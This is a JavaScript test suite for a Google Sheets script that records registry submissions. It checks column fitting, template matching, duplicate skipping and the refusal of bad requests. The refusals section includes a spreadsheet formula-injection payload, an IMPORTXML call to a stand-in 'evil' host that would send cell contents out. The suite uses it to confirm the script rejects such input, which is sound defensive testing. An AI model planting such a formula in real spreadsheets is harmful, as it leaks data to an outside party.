import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { loadApp, loadSheetsScript, makeState, parseCsvLine, plain } from "./helpers.mjs";

const app = loadApp();
const template = parseCsvLine(app.Records.recordToCsv(null).replace(/^﻿/, "").split("\r\n")[0]);

let submissions = 0;
function record(tier = 1, change = () => {}) {
  const state = makeState(app, tier);
  state.meta.id = `UC-${++submissions}`;
  state.meta.submittedAt = `2026-01-01T00:00:00.${String(submissions).padStart(3, "0")}Z`;
  const built = plain(app.Records.buildRecord(state, { status: "submitted" }));
  change(built);
  return built;
}
const cell = (tab, id, row = 1) => tab.rows[row][tab.rows[0].findIndex((h) => String(h).split(" ")[0] === id)];
const isFormula = (value) => /^[=+@-]/.test(String(value));

describe("Google Sheets script: writing rows", () => {
  for (const [tier, columns] of [[1, 27], [2, 35], [3, 43]]) {
    it(`creates the tab and fits a tier ${tier} record (${columns} columns)`, () => {
      const script = loadSheetsScript();
      assert.equal(script.post(record(tier)).ok, true);
      assert.equal(script.tab().rows[0].length, columns);
      assert.equal(script.tab().rows.length, 2);
    });
  }

  it("lines up different tiers in one tab", () => {
    const script = loadSheetsScript();
    const first = record(1);
    const second = record(3);
    script.post(first);
    script.post(second);
    assert.equal(cell(script.tab(), "record_id", 1), first.id);
    assert.equal(cell(script.tab(), "record_id", 2), second.id);
    assert.equal(cell(script.tab(), "tier", 2), "3");
  });

  it("fills the matching columns of an imported template", () => {
    const script = loadSheetsScript({ header: template.slice() });
    const sent = record(3, (r) => { r.fields["A1.2"] = "Summary"; });
    assert.equal(script.post(sent).ok, true);
    assert.deepEqual(plain(script.tab().rows[0]), template);
    assert.equal(cell(script.tab(), "A1.2"), "Summary");
  });

  it("matches a template header that kept its BOM", () => {
    const script = loadSheetsScript({ header: [`﻿${template[0]}`, ...template.slice(1)] });
    script.post(record());
    assert.equal(script.tab().rows[0].filter((h) => String(h).split(" ")[0] === "record_id").length, 1);
  });

  it("adds a column for a new field past the template's last column", () => {
    const script = loadSheetsScript({ header: template.slice() });
    assert.equal(script.post(record(1, (r) => { r.fields["Z9.1"] = "New"; })).ok, true);
    assert.equal(script.tab().rows[0].length, template.length + 1);
    assert.equal(cell(script.tab(), "Z9.1"), "New");
  });

  it("skips a record that was resent", () => {
    const script = loadSheetsScript();
    const sent = record();
    script.post(sent);
    assert.equal(script.post(sent).duplicate, true);
    assert.equal(script.tab().rows.length, 2);
  });

  it("gives an updated record its own row", () => {
    const script = loadSheetsScript();
    const sent = record();
    script.post(sent);
    script.post({ ...sent, submittedAt: "2026-06-01T00:00:00.000Z" });
    assert.equal(script.tab().rows.length, 3);
  });

  it("stops a value from running as a formula", () => {
    const script = loadSheetsScript();
    script.post(record(1, (r) => { r.fields["A1.2"] = "=1+1"; }));
    assert.equal(cell(script.tab(), "A1.2"), "'=1+1");
  });
});

describe("Google Sheets script: refusing requests", () => {
  const refusals = {
    "a formula as a field id": (r) => { r.fields['=IMPORTXML("https://evil/?"&A2,"//a")'] = "x"; },
    "a formula as an answer id": (r) => { r.screening.answers["=1+1"] = "no"; },
    "a formula as a contact subfield": (r) => { r.fields["A1.7"] = { "=1+1": "x" }; },
    "an empty id": (r) => { r.fields[""] = "x"; },
    "an id with a space": (r) => { r.fields["A 1"] = "x"; },
    "an id that is too long": (r) => { r.fields["A".repeat(65)] = "x"; },
  };
  for (const [name, change] of Object.entries(refusals)) {
    it(`refuses ${name} and writes nothing`, () => {
      const script = loadSheetsScript({ header: template.slice() });
      const reply = script.post(record(1, change));
      assert.equal(reply.ok, false);
      assert.match(reply.error, /Invalid question or field id/);
      assert.equal(script.tab().rows.length, 1);
      assert.deepEqual(plain(script.tab().rows[0]), template);
    });
  }

  it("never puts a live formula in the header", () => {
    const script = loadSheetsScript();
    script.post(record(1, (r) => { r.fields["=1+1"] = "x"; }));
    assert.equal((script.tab().rows[0] || []).filter(isFormula).length, 0);
  });

  it("refuses a record that would need too many columns", () => {
    const script = loadSheetsScript();
    const reply = script.post(record(1, (r) => {
      for (let i = 0; i < script.constant("MAX_COLUMNS"); i++) r.fields[`F${i}`] = "x";
    }));
    assert.equal(reply.ok, false);
    assert.match(reply.error, /too many columns/);
    assert.equal(script.tab().rows.length, 0);
  });

  it("refuses a wrong token", () => {
    const script = loadSheetsScript();
    assert.match(script.post(record(), "wrong").error, /token/);
    assert.equal(script.tab(), undefined);
  });

  it("refuses a body that isn't JSON", () => {
    assert.match(loadSheetsScript().post("not json").error, /not JSON/);
  });

  it("refuses JSON that isn't a registry record", () => {
    assert.match(loadSheetsScript().post({ schema: "other" }).error, /Not a registry record/);
  });
});
